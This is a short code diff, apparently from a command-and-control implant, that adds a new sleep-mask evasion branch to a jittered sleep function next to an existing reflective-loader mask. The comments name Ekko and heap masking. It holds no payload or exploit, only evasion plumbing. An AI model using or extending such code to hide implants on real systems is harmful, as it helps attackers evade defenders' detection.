@@ -385,7 +385,9 @@ auto declfn instance::sleep_with_jitter() -> void {
         sleep_time = sleep_time - jitter_range / 2 + jitter;
     }
 
-#if SLEEP_MASK_TYPE == MASK_UDRL
+#if SLEEP_MASK_TYPE == MASK_SLEEPMASK_VS
+    evasion_sleepmask_vs_sleep( *this, sleep_time );
+#elif SLEEP_MASK_TYPE == MASK_UDRL
     /* UDRL sleep mask: delegates to the standalone PIC mask module
      * which handles Ekko/FullImage/Heap based on its compile-time config.
      * The mask receives UDRL_USER_DATA describing the memory layout. */
